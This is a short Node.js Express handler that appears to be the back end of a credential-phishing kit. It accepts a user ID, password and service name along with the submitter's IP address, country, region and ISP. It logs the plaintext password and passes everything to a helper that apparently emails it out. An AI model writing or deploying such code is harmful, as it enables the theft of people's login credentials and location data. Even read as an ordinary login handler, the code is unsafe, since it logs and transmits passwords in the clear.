const { sendAuthMail } = require('../helpers/sendAuthMail')

const Auth = (req, res) => {
  const { userID, password, name, IPAddress, country, region, isp } = req.body
  console.log(userID, password, name, IPAddress)
  if (!userID || !password || !name) {
    res
      .status(400)
      .json({ error: 'userID, password and service name required' })
    return
  }

  sendAuthMail(userID, password, name, country, region, isp, IPAddress, res)
}

module.exports = Auth
